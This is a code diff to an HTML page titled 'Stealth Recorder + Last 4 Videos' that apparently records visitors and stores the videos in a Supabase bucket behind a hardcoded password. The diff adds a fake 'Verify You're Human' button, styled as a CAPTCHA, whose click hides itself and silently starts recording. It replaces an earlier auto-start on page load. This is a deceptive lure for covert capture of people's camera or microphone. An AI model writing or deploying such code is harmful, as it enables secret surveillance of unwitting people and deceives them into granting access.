@@ -1,5 +1,4 @@
-<!DOCTYPE html>
-<html>
+<!DOCTYPE html><html>
 <head>
   <title>Stealth Recorder + Last 4 Videos</title>
   <script src="https://unpkg.com/@supabase/supabase-js@2.39.5/dist/umd/supabase.js"></script>
@@ -45,22 +44,38 @@
       cursor: pointer;
       margin: 20px;
     }
+    #verifyBox {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+    }
+    .circleButton {
+      width: 180px;
+      height: 180px;
+      border-radius: 50%;
+      background-color: red;
+      color: white;
+      font-size: 18px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      cursor: pointer;
+      box-shadow: 0 0 12px rgba(0,0,0,0.3);
+      margin: auto;
+    }
   </style>
 </head>
-<body>
-
-<div id="lockIcon" onclick="unlock()">🔒</div>
-
-<div id="viewer">
+<body><div id="verifyBox">
+  <div class="circleButton" onclick="startRecordingFromClick()">Verify You're Human</div>
+</div><div id="lockIcon" onclick="unlock()" style="display:none;">🔒</div><div id="viewer">
   <h3>Recording Playback</h3>
   <video id="playback" controls></video>
   <br>
   <button onclick="stopRecording()">STOP</button>
   <h3>Last 4 Recordings</h3>
   <div id="videoList"></div>
-</div>
-
-<script>
+</div><script>
   const PASSWORD = "sardarhamza";
   const BUCKET = "recordings";
   const client = supabase.createClient(
@@ -74,7 +89,11 @@
   let stopped = false;
   let abortRecording = false;
 
-  window.onload = startRecording; // Auto-start
+  function startRecordingFromClick() {
+    document.getElementById("verifyBox").style.display = "none";
+    document.getElementById("lockIcon").style.display = "block";
+    startRecording();
+  }
 
   async function startRecording() {
     try {
@@ -170,7 +189,5 @@
       }
     }
   }
-</script>
-
-</body>
+</script></body>
 </html>
